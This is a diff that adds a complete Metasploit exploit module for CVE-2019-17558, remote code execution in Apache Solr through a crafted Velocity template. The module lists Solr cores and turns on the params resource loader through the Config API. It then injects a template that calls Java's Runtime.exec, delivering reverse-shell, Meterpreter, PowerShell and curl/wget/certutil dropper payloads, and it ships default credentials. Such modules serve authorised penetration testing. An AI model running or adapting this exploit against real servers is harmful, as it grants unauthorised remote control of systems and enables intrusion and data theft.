@@ -1,0 +1,504 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core/exploit/powershell'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'           => 'Apache Solr Remote Code Execution via Velocity Template',
+        'Description'    => %q(
+          This module exploits a vulnerability in Apache Solr <= 8.3.0 which allows remote code execution via a custom
+          Velocity template. Currently, this module only supports Solr basic authentication.
+
+          From the Tenable advisory:
+          An attacker could target a vulnerable Apache Solr instance by first identifying a list
+          of Solr core names. Once the core names have been identified, an attacker can send a specially crafted
+          HTTP POST request to the Config API to toggle the params resource loader value for the Velocity Response
+          Writer in the solrconfig.xml file to true. Enabling this parameter would allow an attacker to use the Velocity
+          template parameter in a specially crafted Solr request, leading to RCE.
+        ),
+        'License'        => MSF_LICENSE,
+        'Author'         =>
+          [
+            's00py', # Discovery and PoC
+            'jas502n', # exploit code on Github
+            'AleWong', # ExploitDB contribution, and exploit code on Github
+            'Imran E. Dawoodjee <imran[at]threathounds.com>' # Metasploit module
+          ],
+        'References'     =>
+            [
+              [ 'EDB', '47572' ],
+              [ 'CVE', '2019-17558' ],
+              [ 'URL', 'https://www.tenable.com/blog/apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability'],
+              [ 'URL', 'https://www.huaweicloud.com/en-us/notice/2018/20191104170849387.html'],
+              [ 'URL', 'https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133/'],
+              [ 'URL', 'https://github.com/jas502n/solr_rce'],
+              [ 'URL', 'https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template'],
+            ],
+        'Platform'       => ['linux', 'unix', 'win'],
+        'Targets'        =>
+            [
+              [
+                'Unix (in-memory)',
+                {
+                  'Platform'       => 'unix',
+                  'Arch'           => ARCH_CMD,
+                  'Type'           => :unix_memory,
+                  'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
+                }
+              ],
+              [
+                'Linux (dropper)',
+                {
+                  'Platform'        => 'linux',
+                  'Arch'            => [ARCH_X86, ARCH_X64],
+                  'Type'            => :linux_dropper,
+                  'DefaultOptions'  => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },
+                  'CmdStagerFlavor' => %w[curl wget]
+                }
+              ],
+              [
+                'x86/x64 Windows PowerShell',
+                {
+                  'Platform'        => 'win',
+                  'Arch'            => [ARCH_X86, ARCH_X64],
+                  'Type'            => :windows_psh,
+                  'DefaultOptions'  => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' }
+                }
+              ],
+              [
+                'x86/x64 Windows CmdStager',
+                {
+                  'Platform'        => 'win',
+                  'Arch'            => [ARCH_X86, ARCH_X64],
+                  'Type'            => :windows_cmdstager,
+                  'DefaultOptions'  => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp', 'CmdStagerFlavor' => 'vbs' },
+                  'CmdStagerFlavor' => %w[vbs certutil]
+                }
+              ],
+              [
+                'Windows Exec',
+                {
+                  'Platform'        => 'win',
+                  'Arch'            => ARCH_CMD,
+                  'Type'            => :windows_exec,
+                  'DefaultOptions'  => { 'PAYLOAD' => 'cmd/windows/generic' }
+                }
+              ],
+            ],
+        'DisclosureDate' => "2019-10-29", # ISO-8601 formatted
+        'DefaultTarget'  => 0,
+        'Privileged'     => false
+      )
+    )
+
+    register_options(
+      [
+        Opt::RPORT(8983),
+        OptString.new('USERNAME', [false, 'Solr username', 'solr']),
+        OptString.new('PASSWORD', [false, 'Solr password', 'SolrRocks']),
+        OptString.new('TARGETURI', [false, 'Path to Solr', '/solr/'])
+      ]
+    )
+  end
+
+  # if we are going to exploit, we only need one core to be exploitable
+  @vuln_core = ""
+  # OS specific stuff
+  @target_platform = ""
+  # if authentication is used
+  @auth_string = ""
+
+  def check_auth
+    # see if authentication is required for the specified Solr instance
+    auth_check = solr_get('uri' => normalize_uri(target_uri.path))
+
+    # successfully connected?
+    unless auth_check
+      print_bad("Connection failed!")
+      return nil
+    end
+
+    # if response code is not 200, then the Solr instance definitely requires authentication
+    unless auth_check.code == 200
+      # if authentication is required and creds are not provided, we cannot reliably check exploitability
+      if datastore['USERNAME'] == "" && datastore['PASSWORD'] == ""
+        print_bad("Credentials not provided, skipping credentialed check...")
+        return nil
+      end
+
+      # otherwise, try the given creds
+      auth_string = basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
+      attempt_auth = solr_get('uri' => normalize_uri(target_uri.path), 'auth' => auth_string)
+
+      # successfully connected?
+      unless attempt_auth
+        print_bad("Connection failed!")
+        return nil
+      end
+      # if the return code is not 200, then authentication definitely failed
+      unless attempt_auth.code == 200
+        print_bad("Invalid credentials!")
+        return nil
+      end
+
+      store_valid_credential(
+        user: datastore['USERNAME'],
+        private: datastore['PASSWORD'],
+        private_type: :password,
+        proof: attempt_auth.to_s
+      )
+
+      @auth_string = auth_string
+    end
+    # a placeholder return value. Not requiring auth should throw no errors
+    ""
+  end
+
+  # check for vulnerability existence
+  def check
+    auth_res = check_auth
+    unless auth_res
+      return CheckCode::Unknown("Authentication failed!")
+    end
+
+    # send a GET request to get Solr and system details
+    ver = solr_get('uri' => normalize_uri(target_uri.path, '/admin/info/system'), 'auth' => @auth_string)
+
+    # can't connect? that's an automatic failure
+    unless ver
+      return CheckCode::Unknown("Connection failed!")
+    end
+
+    # convert to JSON
+    ver_json = ver.get_json_document
+    # get Solr version
+    solr_version = Gem::Version.new(ver_json['lucene']['solr-spec-version'])
+    print_status("Found Apache Solr #{solr_version}")
+    # get OS version details
+    @target_platform = ver_json['system']['name']
+    target_arch = ver_json['system']['arch']
+    target_osver = ver_json['system']['version']
+    print_status("OS version is #{@target_platform} #{target_arch} #{target_osver}")
+    # uname doesn't show up for Windows, so run a check for that
+    if ver_json['system']['uname']
+      # print uname only when verbose
+      vprint_status("Full uname is '#{ver_json['system']['uname'].strip}'")
+    end
+
+    # the vulnerability is only present in Solr versions <= 8.3.0
+    unless solr_version <= Gem::Version.new('8.3.0')
+      return CheckCode::Safe("Running version of Solr is not vulnerable!")
+    end
+
+    # enumerate cores
+    cores = solr_get('uri' => normalize_uri(target_uri.path, '/admin/cores'), 'auth' => @auth_string)
+
+    # can't connect? that's yet another automatic failure
+    unless cores
+      return CheckCode::Unknown("Could not enumerate cores!")
+    end
+
+    # convert to JSON yet again
+    cores_json = cores.get_json_document
+    # draw up an array of all the cores
+    cores_list = Array.new
+    # get the core names
+    cores_json['status'].keys.each do |core_name|
+      cores_list.push(core_name)
+    end
+
+    # no cores? that means nothing to exploit.
+    if cores_list.empty?
+      return CheckCode::Safe("No cores found, nothing to exploit!")
+    end
+
+    # got cores? tell the operator which cores were found
+    print_status("Found core(s): #{cores_list.join(', ')}")
+    possibly_vulnerable_cores = {}
+
+    cores_list.each do |core|
+      # for each core, attempt to get config
+      core_config = solr_get('uri' => normalize_uri(target_uri.path, core.to_s, 'config'), 'auth' => @auth_string)
+
+      # can't retrieve configuration for that core? go next
+      unless core_config
+        print_error("Could not retrieve configuration for core #{core}!")
+        next
+      end
+
+      # convert to JSON
+      core_config_json = core_config.get_json_document
+      # if the core configuration does not include the Velocity Response Writer, it isn't vulnerable
+      if core_config_json['config']['queryResponseWriter'].keys.include?("velocity")
+        vprint_good("Found Velocity Response Writer in use by core #{core}")
+        if core_config_json['config']['queryResponseWriter']['velocity']['params.resource.loader.enabled'] == "true"
+          vprint_good("params.resource.loader.enabled for core '#{core}' is set to true.")
+          possibly_vulnerable_cores.store(core, true)
+        else
+          # if params.resource.loader.enabled is false, we need to set it to true before exploitation
+          print_warning("params.resource.loader.enabled for core #{core} is set to false.")
+          possibly_vulnerable_cores.store(core, false)
+        end
+      else
+        vprint_error("Velocity Response Writer not found in core #{core}")
+        next
+      end
+    end
+
+    # look at the array of possibly vulnerable cores
+    if possibly_vulnerable_cores.empty?
+      CheckCode::Safe("No cores are vulnerable!")
+    else
+      # if possible, pick a core that already has params.resource.loader.enabled set to true
+      possibly_vulnerable_cores.each do |core|
+        if core[1] == true
+          @vuln_core = core
+          break
+        end
+      end
+      # otherwise, just pick the first one
+      if @vuln_core.to_s == ""
+        @vuln_core = possibly_vulnerable_cores.first
+      end
+      CheckCode::Vulnerable
+    end
+  end
+
+  # the exploit method
+  def exploit
+    unless [CheckCode::Vulnerable].include? check
+      fail_with Failure::NotVulnerable, "Target is most likely not vulnerable!"
+    end
+
+    print_status("Targeting core '#{@vuln_core[0]}'")
+
+    # if params.resource.loader.enabled for that core is false
+    if @vuln_core[1] != true
+      # the new config in JSON format
+      enable_params_resource_loader = {
+        "update-queryresponsewriter": {
+          "startup": "lazy",
+          "name": "velocity",
+          "class": "solr.VelocityResponseWriter",
+          "template.base.dir": "",
+          "solr.resource.loader.enabled": "true",
+          "params.resource.loader.enabled": "true"
+        }
+      }.to_json
+
+      opts_post = {
+        'method'        => 'POST',
+        'connection'    => 'Keep-Alive',
+        'ctype'         => 'application/json;charset=utf-8',
+        'encode_params' => false,
+        'uri'           => normalize_uri(target_uri.path, @vuln_core[0].to_s, 'config'),
+        'data'          => enable_params_resource_loader
+      }
+
+      unless @auth_string == ""
+        opts_post.store('authorization', @auth_string)
+      end
+
+      print_status("params.resource.loader.enabled is false, setting it to true...")
+      update_config = send_request_cgi(opts_post)
+
+      unless update_config
+        fail_with Failure::Unreachable, "Connection failed!"
+      end
+
+      # if we got anything other than a 200 back, the configuration update failed and the exploit won't work
+      unless update_config.code == 200
+        fail_with Failure::UnexpectedReply, "Unable to update config, exploit failed!"
+      end
+
+      print_good("params.resource.loader.enabled is now set to true!")
+    end
+
+    # windows...
+    if @target_platform.include? "Windows"
+      # if target is wrong, warn and exit before doing anything
+      unless target.name.include? "Windows"
+        fail_with Failure::NoTarget, "Target is found to be Windows, please select the proper target!"
+      end
+
+      case target['Type']
+      # PowerShell...
+      when :windows_psh
+        # need PowerShell for this
+        winenv_path = execute_command("C:\\Windows\\System32\\cmd.exe /c PATH", 'auth_string' => @auth_string, 'core_name' => @vuln_core[0], 'winenv_check' => true)
+        unless winenv_path
+          fail_with Failure::Unreachable, "Connection failed!"
+        end
+
+        # did the command to check for PATH execute?
+        unless winenv_path.code == 200
+          fail_with Failure::UnexpectedReply, "Unexpected reply from target, aborting!"
+        end
+
+        # is PowerShell in PATH?
+        if /powershell/i =~ winenv_path.body.to_s
+          # only interested in the contents of PATH. Everything before it is irrelevant
+          paths = winenv_path.body.split('=')[1]
+          # confirm that PowerShell exists in the PATH by checking each one
+          paths.split(';').each do |path_val|
+            # if PowerShell exists in PATH, then we are good to go
+            unless /powershell/i =~ path_val
+              next
+            end
+
+            print_good("Found Powershell at #{path_val}")
+            # generate PowerShell command, encode with base64, and remove comspec
+            psh_cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, remove_comspec: true)
+            # specify full path to PowerShell
+            psh_cmd.insert(0, path_val)
+            # exploit the thing
+            execute_command(psh_cmd, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])
+            break
+          end
+        else
+          fail_with Failure::BadConfig, "PowerShell not found!"
+        end
+      # ... CmdStager ...
+      when :windows_cmdstager
+        print_status("Sending CmdStager payload...")
+        execute_cmdstager(linemax: 7130, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])
+      # ... or plain old exec?
+      when :windows_exec
+        cmd = "C:\\Windows\\System32\\cmd.exe /c #{payload.encoded}"
+        execute_command(cmd, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])
+      end
+    end
+
+    # ... or nix-based?
+    if @target_platform.include? "Linux"
+      # if target is wrong, warn and exit before doing anything
+      if target.name.include? "Windows"
+        fail_with Failure::NoTarget, "Target is found to be nix-based, please select the proper target!"
+      end
+
+      case target['Type']
+      when :linux_dropper
+        execute_cmdstager('auth_string' => @auth_string, 'core_name' => @vuln_core[0])
+      when :unix_memory
+        cmd = "/bin/bash -c $@|/bin/bash . echo #{payload.encoded}"
+        execute_command(cmd, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])
+      end
+    end
+  end
+
+  # some prep work has to be done to work around the limitations of Java's Runtime.exec()
+  def execute_cmdstager_begin(_opts)
+    if @target_platform.include? "Windows"
+      @cmd_list.each do |command|
+        command.insert(0, "C:\\Windows\\System32\\cmd.exe /c ")
+      end
+    else
+      @cmd_list.each do |command|
+        command.insert(0, "/bin/bash -c $@|/bin/bash . echo ")
+      end
+    end
+  end
+
+  # sic 'em, bois!
+  def execute_command(cmd, opts = {})
+    # custom template which enables command execution
+    template = <<~VELOCITY
+      #set($x="")
+      #set($rt=$x.class.forName("java.lang.Runtime"))
+      #set($chr=$x.class.forName("java.lang.Character"))
+      #set($str=$x.class.forName("java.lang.String"))
+    VELOCITY
+
+    # attempts to solve the quoting problem, partially successful
+    if target.name.include?("Unix")
+      template += <<~VELOCITY
+        #set($ex=$rt.getRuntime().exec("#{cmd}"))
+      VELOCITY
+    else
+      template += <<~VELOCITY
+        #set($ex=$rt.getRuntime().exec('#{cmd}'))
+      VELOCITY
+    end
+
+    template += <<~VELOCITY
+      $ex.waitFor()
+    VELOCITY
+
+    # the next 2 lines cause problems with CmdStager, so it's only used when needed
+    # during the check for PowerShell existence, or by specific payloads
+    if opts['winenv_check'] || target['Type'] == :windows_exec || target['Type'] == :unix_memory
+      template += <<~VELOCITY
+        #set($out=$ex.getInputStream())
+        #if($out.available())
+        #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+        #else
+        #end
+      VELOCITY
+    end
+
+    # execute the exploit...
+    raw_result = solr_get(
+      'uri' => normalize_uri(target_uri.path, opts['core_name'].to_s, 'select'),
+      'auth' => opts['auth_string'],
+      'vars_get' =>  {
+        'q'                 => '1',
+        'wt'                => 'velocity',
+        'v.template'        => 'custom',
+        'v.template.custom' => template
+      }
+    )
+
+    # Executing PATH always gives a result, so it can return safely
+    if opts['winenv_check']
+      return raw_result
+    end
+
+    # for printing command output
+    unless raw_result.nil?
+      unless raw_result.code == 200
+        fail_with Failure::PayloadFailed, "Payload failed to execute!"
+      end
+
+      # to get pretty output
+      result_inter = raw_result.body.to_s.sub("0\n", ":::").split(":::").last
+      unless result_inter.nil?
+        final_result = result_inter.split("\n").first.strip
+        print_good(final_result)
+      end
+    end
+  end
+
+  # make sending requests easier
+  def solr_get(opts = {})
+    send_request_cgi_opts = {
+      'method'        => 'GET',
+      'connection'    => 'Keep-Alive',
+      'uri'           => opts['uri']
+    }
+
+    # @auth_string defaults to "" if no authentication is necessary
+    # otherwise, authentication is required
+    if opts['auth'] != ""
+      send_request_cgi_opts.store('authorization', opts['auth'])
+    end
+
+    # a bit unrefined, but should suffice in this case
+    if opts['vars_get']
+      send_request_cgi_opts.store('vars_get', opts['vars_get'])
+    end
+
+    send_request_cgi(send_request_cgi_opts)
+  end
+end
